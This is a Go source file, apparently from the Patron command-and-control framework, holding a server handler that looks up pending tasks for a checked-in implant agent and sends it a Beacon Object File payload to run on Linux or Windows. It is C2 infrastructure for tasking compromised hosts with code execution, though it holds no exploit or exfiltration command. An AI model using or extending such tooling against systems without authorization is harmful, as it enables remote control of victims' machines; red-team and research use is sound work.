package handlers

import (
	"fmt"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
)

// BOFExecutorHandler handles BOF execution requests from agents
type BOFExecutorHandler struct{}

// Handle processes BOF execute requests and returns pending BOFs to execute
func (h *BOFExecutorHandler) Handle(request *patronobuf.Request, stream types.CommonStream) *patronobuf.Response {
	bofExecReq := request.GetBofExecute()
	if bofExecReq == nil {
		logger.Logf(logger.Error, "Invalid BOF execute request")
		return &patronobuf.Response{
			Type: patronobuf.ResponseType_BOF_EXECUTE_RESPONSE,
			Payload: &patronobuf.Response_BofExecuteResponse{
				BofExecuteResponse: &patronobuf.BoFExecuteResponse{
					Uuid:         "",
					Success:      false,
					FunctionName: "Invalid BOF execute request",
				},
			},
		}
	}

	agentUUID := bofExecReq.GetUuid()
	logger.Logf(logger.Info, "BOF Execute Request received from agent %s", agentUUID)

	// Get pending tasks for this agent
	pendingTasks, err := data.GetPendingTasks(agentUUID)
	if err != nil {
		logger.Logf(logger.Error, "Failed to get pending BOF tasks for agent %s: %v", agentUUID, err)

		return &patronobuf.Response{
			Type: patronobuf.ResponseType_BOF_EXECUTE_RESPONSE,
			Payload: &patronobuf.Response_BofExecuteResponse{
				BofExecuteResponse: &patronobuf.BoFExecuteResponse{}, // must stay empty — this is the sentinel
			},
		}
	}

	logger.Logf(logger.Info, "Found %d pending BOF task(s) for agent %s", len(pendingTasks), agentUUID)

	if len(pendingTasks) == 0 {
		logger.Logf(logger.Info, "No pending BOF tasks for agent %s", agentUUID)

		return &patronobuf.Response{
			Type: patronobuf.ResponseType_BOF_EXECUTE_RESPONSE,
			Payload: &patronobuf.Response_BofExecuteResponse{
				BofExecuteResponse: &patronobuf.BoFExecuteResponse{}, // must stay empty — this is the sentinel
			},
		}
	}

	// For now, only process the first pending task (single BOF per request)
	task := pendingTasks[0]
	logger.Logf(logger.Info, "Processing first of %d pending BOF task(s) for agent %s", len(pendingTasks), agentUUID)

	var bofMetadata *types.BOFInfo
	var bofPayload []byte

	// Try to get BOF payload using the task's platform if available
	if task.Platform != "" {
		bofMetadata, bofPayload, err = data.GetBOFByUuid(task.BofUuid, task.Platform)
	} else {
		// Fallback: try both platforms if platform is not set (for legacy tasks)
		bofMetadata, bofPayload, err = data.GetBOFByUuid(task.BofUuid, "linux")
		if err != nil {
			bofMetadata, bofPayload, err = data.GetBOFByUuid(task.BofUuid, "windows")
		}
	}

	if err != nil {
		logger.Logf(logger.Error, "Failed to get BOF %s for agent %s: %v", task.BofUuid, agentUUID, err)

		return &patronobuf.Response{
			Type: patronobuf.ResponseType_BOF_EXECUTE_RESPONSE,
			Payload: &patronobuf.Response_BofExecuteResponse{
				BofExecuteResponse: &patronobuf.BoFExecuteResponse{
					Uuid:         agentUUID,
					Success:      false,
					FunctionName: err.Error(),
				},
			},
		}
	}

	// Determine which platform to use for the request
	requestPlatform := task.Platform
	if requestPlatform == "" {
		// Use the platform that actually worked
		if bofMetadata.Platform == "linux" {
			requestPlatform = "linux"
		} else {
			requestPlatform = "windows"
		}
	}

	// Send BOF execute request to agent with payload
	bofReq := &patronobuf.Request{
		Type: patronobuf.RequestType_BOF_EXECUTE,
		Payload: &patronobuf.Request_BofExecute{
			BofExecute: &patronobuf.BoFExecuteRequest{
				Uuid:         agentUUID,
				Platform:     requestPlatform,
				FunctionName: bofMetadata.FunctionName,
				Payload:      bofPayload,
			},
		},
	}

	if err := common.WriteDelimited(stream, bofReq); err != nil {
		logger.Logf(logger.Error, "Failed to send BOF request to agent %s: %v", agentUUID, err)

		return &patronobuf.Response{
			Type: patronobuf.ResponseType_BOF_EXECUTE_RESPONSE,
			Payload: &patronobuf.Response_BofExecuteResponse{
				BofExecuteResponse: &patronobuf.BoFExecuteResponse{}, // must stay empty — this is the sentinel
			},
		}
	}

	logger.Logf(logger.Info, "Sent BOF execute request for function %s to agent %s", task.BofUuid, agentUUID)

	data.MarkTaskCompleted(task.Id, agentUUID, "completed", "BOF sent successfully")

	return &patronobuf.Response{
		Type: patronobuf.ResponseType_BOF_EXECUTE_RESPONSE,
		Payload: &patronobuf.Response_BofExecuteResponse{
			BofExecuteResponse: &patronobuf.BoFExecuteResponse{}, // must stay empty — this is the sentinel
		},
	}
}

// HandleBOFPayload processes the BOF payload from the request
func (h *BOFExecutorHandler) HandleBOFPayload(bofExecReq *patronobuf.BoFExecuteRequest, stream types.CommonStream) error {
	if bofExecReq == nil {
		return fmt.Errorf("nil request")
	}

	logger.Logf(logger.Debug, "Processing BOF payload for function: %s", bofExecReq.GetFunctionName())

	// TODO: Store the BOF payload and execute it later

	return nil
}
